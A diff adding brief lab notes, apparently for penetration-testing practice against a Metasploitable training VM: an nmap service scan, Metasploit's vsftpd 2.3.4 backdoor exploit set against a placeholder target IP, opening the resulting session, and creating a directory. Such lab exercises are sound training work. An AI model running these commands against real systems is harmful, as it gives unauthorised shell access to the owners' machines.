@@ -1,0 +1,12 @@
+nmap -sV -A <Metasploitable_IP> 
+
+msfconsole
+
+use exploit/unix/ftp/vsftpd_234_backdoor 
+ set RHOST <Metasploitable_IP> 
+ exploit 
+
+sessions –i 1: to restart the session 
+
+mkdir dvs
+
